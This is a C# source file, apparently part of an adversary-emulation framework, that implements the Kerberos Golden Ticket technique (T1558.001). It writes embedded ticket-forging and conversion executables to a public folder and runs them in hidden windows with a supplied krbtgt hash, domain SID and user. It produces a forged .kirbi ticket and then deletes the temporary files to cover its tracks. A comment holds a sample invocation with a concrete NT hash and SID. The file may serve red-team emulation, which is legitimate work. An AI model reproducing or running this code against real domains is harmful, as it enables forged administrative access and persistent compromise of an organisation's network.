using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Threading;

class Technique
{
    /*
		T1558-001 (Steal or Forge Kerberos Tickets: Golden Ticket).

        //TODO
        //[ ] Implement workfolder to drop the resources
        //[ ] Refreeze with cx_freeze without dale as the name

        //Arguments
        // 1 - krbtgt - required
        // 2 - domain sid - required
        // 3 - domain FQDN - required
        // 4 - UID - required
        // 5 - Username - required
    */

    public static Dictionary<string, string> EntryData { get; set; }
	public static Dictionary<string, string> ExitData { get; set; }

	public static bool execCommand(string[] args)
	{

        string workfolder = @"\Users\Public\"; //change this into the framework used workfolder variable
        List<String> tempFiles = new List<String>();

        //Drop both resources to disk
        try
        {
            Console.WriteLine("[T1558-001] Dropping the golden ticket generator and ticket converter to disk.");

            byte[] goldBytes = T1558_001.Properties.Resources._00_gold;
            File.WriteAllBytes(workfolder + "gold.zip", goldBytes);
            tempFiles.Add(workfolder + "gold.zip");

            byte[] convertBytes = T1558_001.Properties.Resources._01_convert;
            File.WriteAllBytes(workfolder + "convert.zip", convertBytes);
            tempFiles.Add(workfolder + "convert.zip");
        }
        catch (Exception e)
        {
            Console.WriteLine("[T1558-001] Failed dropping the golden ticket generator and ticket converter to disk.\n" + e);
        }

        //zipfile extract them to c:\\users\\public\\golden
        try
        {
            Console.WriteLine("[T1558-001] Extracting the zip files.");

            ZipFile.ExtractToDirectory(workfolder + "gold.zip", @"\Users\Public\");
            tempFiles.Add(workfolder + "00-gold");

            ZipFile.ExtractToDirectory(workfolder + "convert.zip", @"\Users\Public\");
            tempFiles.Add(workfolder + "01-convert");
        }
        catch (Exception e)
        {
            Console.WriteLine("[T1558-001] Failed extracting the zip files, maybe they were deleted.\n" + e);
        }

        //execute golden with the command - gold.exe -nthash 4031b5ae4b9defa1f411f26610493e0c -domain-sid S-1-5-21-126282473-2140987555-3925513934 -domain Win2016.local baduser
        try
        {
            Console.WriteLine("[T1558-001] Generating Golden Ticket File with Ticketer.");

            System.Diagnostics.Process goldenProcess = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo goldenInfo = new System.Diagnostics.ProcessStartInfo();

            goldenInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            goldenInfo.FileName = workfolder + @"00-gold\dale.exe";
            goldenInfo.Arguments = "-nthash " + args[0] + " -domain-sid " + args[1] + " -domain " + args[2] + " -user-id " + args[3] + " " + args[4];
            goldenInfo.RedirectStandardOutput = true;
            goldenInfo.UseShellExecute = false;
            goldenInfo.WorkingDirectory = workfolder;

            goldenProcess.StartInfo = goldenInfo;
            goldenProcess.Start();
            goldenProcess.WaitForExit();

            tempFiles.Add(workfolder + args[4] + ".ccache");
        }
        catch (Exception e)
        {
            Console.WriteLine("[T1558-001] Failed executing ticketer, could not create the golden ticket.\n" + e);
        }

        //execute convert with the command - convert.exe .\baduser.ccache .\baduser.kirbi
        try
        {
            Console.WriteLine("[T1558-001] Converting the ticket from CCache to Kirbi.");

            System.Diagnostics.Process goldenProcess = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo goldenInfo = new System.Diagnostics.ProcessStartInfo();

            goldenInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            goldenInfo.FileName = workfolder + @"01-convert\dale2.exe";
            goldenInfo.Arguments = args[4] + ".ccache " + args[4] + ".kirbi";
            goldenInfo.RedirectStandardOutput = true;
            goldenInfo.UseShellExecute = false;
            goldenInfo.WorkingDirectory = workfolder;

            goldenProcess.StartInfo = goldenInfo;
            goldenProcess.Start();
            goldenProcess.WaitForExit();
        }
        catch (Exception e)
        {
            Console.WriteLine("[T1558-001] Failed converting the ticket from CCache to Kirbi.\n" + e);
        }

        //print out that the ticket was written to X and delete all the other files
        try
        {
            Console.WriteLine("[T1558-001] Deleting all the temporary files and finalizing execution.");
            tempFiles.ForEach(delegate (String item) {
                //get the file attributes
                FileAttributes attr = File.GetAttributes(item);

                //detect whether its a directory or file
                if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                    Directory.Delete(item, true);
                else
                    File.Delete(item);
            });
            Console.WriteLine("[T1558-001] Finished execution with success, the golden ticket was created on ."+workfolder+args[4]+".kirbi. Enjoy!");
            return true;
        }
        catch (Exception)
        {

            return false;
        }
        
    }

	public static void Main(string[] args)
	{
		Console.WriteLine("[T1558-001] Starting Execution!");
		Console.WriteLine("[T1558-001] Generating golden ticket for user ID "+args[3]+" on domain \""+args[2]+"\".");
		if (execCommand(args))
		{
			Console.WriteLine("[T1558-001] Successfully executed Technique (return 0)! ");
		}
		else
		{
			Console.WriteLine("[T1558-001] Oops, something went wrong! ");
		}
	}
}